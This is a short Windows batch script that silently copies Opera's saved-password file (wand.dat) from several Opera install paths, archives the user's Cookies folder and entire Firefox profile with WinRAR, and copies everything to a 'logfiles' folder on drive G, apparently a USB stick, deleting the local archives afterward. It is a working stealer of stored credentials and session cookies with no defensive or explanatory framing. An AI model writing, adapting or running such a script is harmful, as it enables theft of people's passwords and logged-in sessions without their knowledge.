@Echo off
@if not exist \logfiles md \logfiles >nul
c:
chdir %APPDATA%\Opera\Opera\profile\ >nul
copy wand.dat g:\logfiles\wand.dat >nul
c:
chdir %APPDATA%\Opera\Opera 10 Preview!\profile\ >nul
copy wand.dat g:\logfiles\ >nul
c:
chdir %ProgramFiles%\Opera AC 3.7\profile
copy wand.bat g:\logfiles\ >nul
c:
chdir %UserProfile%\Cookies\
«C:\Program Files\WinRAR\WinRAR.exe» u -r -y -ep1 Cookies.rar *.*
copy Cookies.rar g:\logfiles\ >nul
del Cookies.rar >nul
c:
chdir %APPDATA%\Mozilla\Firefox\ >nul
«C:\Program Files\WinRAR\WinRAR.exe» u -r -y -ep1 Profiles.rar *.*
copy Profiles.rar g:\logfiles\ >nul
del profiles.rar >nul